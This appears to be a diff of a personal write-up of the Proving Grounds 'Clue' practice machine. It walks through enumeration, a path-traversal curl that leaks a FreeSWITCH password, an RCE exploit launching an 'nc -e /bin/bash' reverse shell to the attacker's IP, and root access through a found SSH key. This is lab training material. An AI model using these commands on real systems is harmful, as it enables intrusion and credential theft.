@@ -8,9 +8,6 @@ categories: oscp proving-grounds
 192.168.199.240
 me - 192.168.45.213
 
-```
-┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
-└─$ sudo nmap -sV -sC -p- -oA Clue 192.168.169.240
 PORT     STATE SERVICE          VERSION
 22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -27,6 +24,7 @@ PORT     STATE SERVICE          VERSION
 |_http-title: Cassandra Web
 8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
 Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 Host script results:
 |_clock-skew: mean: 1h19m17s, deviation: 2h18m35s, median: -43s
 | smb2-security-mode: 
@@ -47,12 +45,12 @@ Host script results:
 | smb2-time: 
 |   date: 2024-07-25T22:43:55
 |_  start_date: N/A
-```
+
 
 
 looks like port 80 is a no-go currently (getting a 403 response) so we are going to table that for now. Also seeing Samba which could be fun but going to put a pin in that for now and try out http://192.168.199.240:3000/
 
-```
+
 nmap -v -p 139,445 --script smb-os-discovery 192.168.199.240
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:54 EDT
@@ -94,10 +92,9 @@ Initiating NSE at 14:54
 Completed NSE at 14:54, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
-```
 
-checking for vuln
-```
+
+
 └─$  nmap -p 139,445 --script smb-vuln* 192.168.199.240
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:57 EDT
 Nmap scan report for 192.168.199.240
@@ -120,9 +117,10 @@ Host script results:
 |_smb-vuln-ms10-061: false
 
 Nmap done: 1 IP address (1 host up) scanned in 59.08 seconds
-```
 
-```
+
+
+
 └─$ smbclient --no-pass -L //192.168.199.240
 
         Sharename       Type      Comment
@@ -138,17 +136,17 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            
-```
 
 
-```
+
+
 smbclient --no-pass //<IP>/<Folder>
-```
 
 
-```
+
+
 smbget --recursive smb://192.168.199.240/backup
-```
+
 
 Downloaded backup, there is a ton of stuff in there, putting a pin in it for now
 
@@ -268,3 +266,180 @@ can't ssh in, only root and anothony soooooo.................
 ==========================================================================================================================
 
 http://192.168.199.240:8021/
+
+site wont load in browser but can telnet to the port so I know its open
+┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
+└─$ telnet 192.168.199.240 8021
+Trying 192.168.199.240...
+Connected to 192.168.199.240.
+Escape character is '^]'.
+Content-Type: auth/request
+
+^]
+telnet> q
+Connection closed.
+
+so lets check searchsploit
+
+┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
+└─$ searchsploit FreeSWITCH   
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metasploit)                          | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                                             | windows/remote/47799.txt
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+auth fails for both default password in the exploit and the found password SecondBiteTheApple330
+
+===================================================================================================================
+
+FreeSWITCH is a free and open-source telephony software for real-time communication protocols using audio, video, text and other forms of media. The software has applications in WebRTC, voice over Internet Protocol (VoIP), video transcoding, Multipoint Control Unit (MCU) functionality and supports Session Initiation Protocol (SIP) features.[10] 
+
+Going back through the configuration files I downloaded from samba:
+
+```
+┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
+└─$ ls
+abstraction.conf.xml         directory.conf.xml        modules.conf.xml            sndfile.conf.xml
+acl.conf.xml                 distributor.conf.xml      mongo.conf.xml              sofia.conf.xml
+alsa.conf.xml                easyroute.conf.xml        msrp.conf.xml               spandsp.conf.xml
+amqp.conf.xml                enum.conf.xml             nibblebill.conf.xml         switch.conf.xml
+amr.conf.xml                 erlang_event.conf.xml     opal.conf.xml               syslog.conf.xml
+amrwb.conf.xml               event_multicast.conf.xml  opus.conf.xml               timezones.conf.xml
+av.conf.xml                  event_socket.conf.xml     oreka.conf.xml              translate.conf.xml
+avmd.conf.xml                fax.conf.xml              osp.conf.xml                tts_commandline.conf.xml
+blacklist.conf.xml           fifo.conf.xml             perl.conf.xml               unicall.conf.xml
+callcenter.conf.xml          format_cdr.conf.xml       pocketsphinx.conf.xml       unimrcp.conf.xml
+cdr_csv.conf.xml             graylog2.conf.xml         portaudio.conf.xml          v8.conf.xml
+cdr_mongodb.conf.xml         hash.conf.xml             post_load_modules.conf.xml  verto.conf.xml
+cdr_pg_csv.conf.xml          hiredis.conf.xml          pre_load_modules.conf.xml   voicemail.conf.xml
+cdr_sqlite.conf.xml          httapi.conf.xml           presence_map.conf.xml       voicemail_ivr.conf.xml
+cepstral.conf.xml            http_cache.conf.xml       python.conf.xml             vpx.conf.xml
+cidlookup.conf.xml           ivr.conf.xml              redis.conf.xml              xml_cdr.conf.xml
+conference.conf.xml          java.conf.xml             rss.conf.xml                xml_curl.conf.xml
+conference_layouts.conf.xml  kazoo.conf.xml            rtmp.conf.xml               xml_rpc.conf.xml
+console.conf.xml             lcr.conf.xml              sangoma_codec.conf.xml      xml_scgi.conf.xml
+curl.conf.xml                local_stream.conf.xml     shout.conf.xml              zeroconf.conf.xml
+db.conf.xml                  logfile.conf.xml          skinny.conf.xml
+dialplan_directory.conf.xml  lua.conf.xml              smpp.conf.xml
+dingaling.conf.xml           memcache.conf.xml         sms_flowroute.conf.xml
+                                                                                                                    
+┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
+└─$ cat event_socket.conf.xml
+<configuration name="event_socket.conf" description="Socket Client">
+  <settings>
+    <param name="nat-map" value="false"/>
+    <param name="listen-ip" value="::"/>
+    <param name="listen-port" value="8021"/>
+    <param name="password" value="ClueCon"/>
+    <!--<param name="apply-inbound-acl" value="loopback.auto"/>-->
+    <!--<param name="stop-on-bind-error" value="true"/>-->
+  </settings>
+</configuration>
+                                                                                                                    
+┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
+└─$ 
+```
+
+Info about the config - https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_event_socket_1048924/
+
+hmmmmm so lets use that earlier exploit to double check to see what that password is set to:
+
+┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
+└─$ python3 exploit.py 192.168.199.240 -p 3000 /etc/freeswitch/conf/autoload_configs/event_socket.conf.xml
+
+python3 exploit.py 192.168.199.240 -p 3000 ../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
+
+curl --path-as-is http://192.168.199.240:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
+┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is http://192.168.199.240:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
+<configuration name="event_socket.conf" description="Socket Client">
+  <settings>
+    <param name="nat-map" value="false"/>
+    <param name="listen-ip" value="0.0.0.0"/>
+    <param name="listen-port" value="8021"/>
+    <param name="password" value="StrongClueConEight021"/>
+  </settings>
+</configuration>
+
+
+
+so the password is actually set to StrongClueConEight021, updated that in our RCE exploit
+
+└─$ python3 exploit.py 192.168.199.240 'nc 192.168.45.213 3000'  ===========> no worky
+└─$ python3 exploit.py 192.168.199.240 'nc 192.168.45.213 3000 -e /bin/bash'
+
+Able to log in and su to cassie, from there I can check out the home dir and see shek can run sudo cassandra-web with no password
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+ls
+anthony
+cassie
+su cassie
+SecondBiteTheApple330
+id
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
+cd /home/cassie
+ls
+id_rsa
+ls -asl
+total 32
+4 drwxr-xr-x 4 cassie cassie 4096 Aug 11  2022 .
+4 drwxr-xr-x 4 root   root   4096 Aug  5  2022 ..
+0 lrwxrwxrwx 1 root   root      9 Aug  5  2022 .bash_history -> /dev/null
+4 -rw-r--r-- 1 cassie cassie  220 Apr 18  2019 .bash_logout
+4 -rw-r--r-- 1 cassie cassie 3526 Apr 18  2019 .bashrc
+4 drwx------ 3 cassie cassie 4096 Aug 11  2022 .gnupg
+4 -rw------- 1 cassie cassie 1823 Aug 11  2022 id_rsa
+4 -rw-r--r-- 1 cassie cassie  807 Apr 18  2019 .profile
+4 drwx------ 2 cassie cassie 4096 Aug 11  2022 .ssh
+cd .ssh
+ls
+known_hosts
+cd ..
+sudo -l
+Matching Defaults entries for cassie on clue:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cassie may run the following commands on clue:
+    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
+```
+
+Can try launching an alt of the site and as root and lets see if we can gain root access through that
+
+```
+cassandra-web -h
+Usage: cassandra-web [options]
+    -B, --bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
+    -H, --hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
+    -P, --port PORT                  integer port that cassandra is running on (default: 9042)
+    -L, --log-level LEVEL            log level (default: info)
+    -u, --username USER              username to use when connecting to cassandra
+    -p, --password PASS              password to use when connecting to cassandra
+    -C, --compression NAME           compression algorithm to use (lz4 or snappy)
+        --server-cert PATH           server ceritificate pathname
+        --client-cert PATH           client ceritificate pathname
+        --private-key PATH           path to private key
+        --passphrase SECRET          passphrase for the private key
+    -h, --help                       Show help
+cassie@clue:/$ 
+```
+so lets try the following:
+```
+sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
+```
+
+so we are now running on 9876
+
+so if we run
+```
+curl --path-as-is http://192.168.199.240:9876/../../../../../../../../etc/passwd
+```
+
+it just hangs.... tried a couple other things and then remembered that random id stored under /home/cassie and pulled that down locally. Tried logging in as anthony and root since they are the only two that have ssh access and it worked for root.
